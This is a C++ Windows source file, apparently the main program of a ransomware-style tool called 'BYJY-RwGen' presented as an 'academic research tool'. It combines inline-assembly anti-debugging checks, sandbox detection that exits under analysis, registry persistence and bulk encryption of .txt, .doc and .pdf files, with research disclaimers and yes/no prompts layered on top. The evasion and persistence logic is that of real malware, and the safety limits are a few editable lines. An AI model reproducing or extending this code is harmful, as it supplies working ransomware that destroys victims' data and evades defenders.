#include <windows.h>
#include <iostream>
#include <vector>
#include <thread>
#include <filesystem>
#include <fstream>
#include <string>

// Include our modules
#include "../core_engine/encryption/file_handler.cpp"
#include "../anti_analysis/sandbox_detection.cpp"
#include "../core_engine/persistence/windows/registry_hook.cpp"

// Configuration embedded at compile time
const char* RESEARCH_ID = "DEFENSIVE-CYBER-2024";
const char* INSTITUTION = "Academic Research Facility";
const bool RESEARCH_MODE = true;

// Anti-debugging inline assembly
__forceinline bool check_debugger_advanced() {
    __try {
        __asm {
            push eax
            push ecx
            
            // Check PEB BeingDebugged flag
            mov eax, fs:[0x30]    // Get PEB
            mov al, [eax + 2]     // BeingDebugged flag
            test al, al
            jnz detected
            
            // Check NtGlobalFlag
            mov eax, fs:[0x30]
            mov al, [eax + 0x68]  // NtGlobalFlag
            and al, 0x70          // Check heap flags
            test al, al
            jnz detected
            
            pop ecx
            pop eax
        }
        return false;
    detected:
        __asm {
            pop ecx
            pop eax
        }
        return true;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return true;
    }
}

void display_research_notice() {
    const char* notice = 
        "=== ACADEMIC RESEARCH TOOL ===\n\n"
        "This is a cybersecurity research tool for defensive analysis.\n"
        "Study ID: DEFENSIVE-CYBER-2024\n"
        "Institution: Academic Research Facility\n\n"
        "*** FOR RESEARCH PURPOSES ONLY ***\n"
        "*** DO NOT USE MALICIOUSLY ***\n\n"
        "Contact: security-research@university.edu";
        
    MessageBoxA(NULL, notice, "Academic Research Tool", 
                MB_OK | MB_ICONINFORMATION);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                     LPSTR lpCmdLine, int nCmdShow) {
    
    // Display research notice first
    if (RESEARCH_MODE) {
        display_research_notice();
    }
    
    // Anti-analysis checks
    AdvancedSandboxDetector detector;
    if (detector.isSandboxed()) {
        MessageBoxA(NULL, "Sandbox detected - Exiting for research safety", 
                   "Research Tool", MB_OK);
        ExitProcess(0);
    }
    
    if (check_debugger_advanced()) {
        MessageBoxA(NULL, "Debugger detected - Exiting for research safety", 
                   "Research Tool", MB_OK);
        ExitProcess(0);
    }
    
    // Initialize encryption (using placeholder key for research)
    std::string encryption_key = "RESEARCH_PLACEHOLDER_KEY_DO_NOT_USE_IN_PROD";
    QuantumFileHandler handler(encryption_key);
    
    // Add target extensions (limited for research)
    std::vector<std::string> research_extensions = {
        ".txt", ".doc", ".pdf"  // Limited scope for research
    };
    
    for (const auto& ext : research_extensions) {
        handler.add_extension(ext);
    }
    
    // Install persistence (for research observation)
    if (MessageBoxA(NULL, 
                   "Install persistence mechanisms for research analysis?", 
                   "Research Tool", 
                   MB_YESNO | MB_ICONQUESTION) == IDYES) {
        GhostPersistence persistence;
        wchar_t current_path[MAX_PATH];
        GetModuleFileNameW(NULL, current_path, MAX_PATH);
        persistence.install(current_path);
    }
    
    // Find target files (limited to user documents for safety)
    std::string search_path = "C:\\Users\\Public\\Documents";
    auto files = handler.find_target_files(search_path);
    
    if (!files.empty()) {
        char message[512];
        sprintf_s(message, sizeof(message), 
                 "Found %zu target files for research encryption.\nProceed?", 
                 files.size());
        
        if (MessageBoxA(NULL, message, "Research Tool", 
                       MB_YESNO | MB_ICONQUESTION) == IDYES) {
            handler.process_files(files, true);
            
            MessageBoxA(NULL, 
                       "Research encryption completed.\n"
                       "Files encrypted with research key for analysis.", 
                       "Research Complete", MB_OK | MB_ICONINFORMATION);
        }
    }
    
    // Create research log
    std::ofstream log("research_log.txt");
    if (log.is_open()) {
        log << "=== BYJY-RwGen Research Execution Log ===" << std::endl;
        log << "Study ID: " << RESEARCH_ID << std::endl;
        log << "Institution: " << INSTITUTION << std::endl;
        log << "Files processed: " << files.size() << std::endl;
        log << "Sandbox detected: " << (detector.isSandboxed() ? "Yes" : "No") << std::endl;
        log << "Debugger detected: " << (check_debugger_advanced() ? "Yes" : "No") << std::endl;
        log.close();
    }
    
    return 0;
}